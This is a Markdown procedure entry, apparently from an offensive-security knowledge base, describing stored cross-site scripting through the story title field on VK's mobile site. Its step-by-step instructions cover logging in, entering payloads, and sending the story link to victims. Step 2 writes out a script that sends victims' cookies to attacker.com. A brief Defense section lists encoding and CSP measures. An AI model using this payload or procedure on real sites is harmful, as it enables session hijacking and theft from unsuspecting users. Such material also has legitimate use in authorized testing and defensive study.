---
id: proc-vk-xss-story-001
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.780Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-in-VK-Story-Title

## Summary

This procedure exploits insufficient input validation in the story title field on VK.com's mobile site (m.vk.com) to inject and execute arbitrary JavaScript in the browsers of users who view the story, potentially leading to session hijacking or data exfiltration.

## Description

The vulnerability arises from the lack of proper sanitization or escaping of user-supplied input in the story title, allowing attackers to insert HTML and JavaScript tags. When a victim accesses the story via m.vk.com, the browser renders the title unsafely, executing the injected script in the context of the victim's session. This can be used to steal cookies, redirect to phishing sites, or perform other client-side attacks. The attack requires a VK account to create the story and social engineering to entice victims to view it.

## Requirements

1. Valid VK.com account with permission to create stories
2. Access to a web browser for testing and payload crafting
3. Internet connectivity to m.vk.com
4. Victim interaction (e.g., clicking a shared story link)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding) for all user inputs in titles and similar fields
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript execution or unexpected alerts in browser logs
- Educate users on avoiding suspicious links in social media

## Objectives

1. Inject and persist malicious JavaScript in a publicly viewable story title
2. Execute the script in the victim's browser to access session data
3. Achieve account compromise or data theft without server-side access

## Instructions

### Step 1: Access Story Creation on m.vk.com

**Context**: Log in and navigate to the stories feature to prepare for payload injection.

Open a mobile browser and go to https://m.vk.com. Log in with your VK credentials. Locate the stories creation option (typically in the profile or feed section) and start creating a new story.

### Step 2: Craft and Inject Payload

**Context**: Enter a malicious payload in the title field to test for XSS reflection.

In the story title input field, enter a test payload like `<script>alert('XSS')</script>` or a more advanced one such as `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` to exfiltrate cookies. Complete any other required fields (e.g., story content) and publish the story.

> The payload will be reflected unsanitized when the story is viewed, executing the script.

### Step 3: Deliver and Verify Execution

**Context**: Share the story link with a victim and confirm execution.

Copy the story URL and send it to a test victim (or use a controlled browser). When the victim opens the link on m.vk.com, observe if the script executes (e.g., alert pops up or data is sent to attacker's server).

> Successful execution indicates the vulnerability is exploitable; monitor attacker's server logs for exfiltrated data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web-injection]]
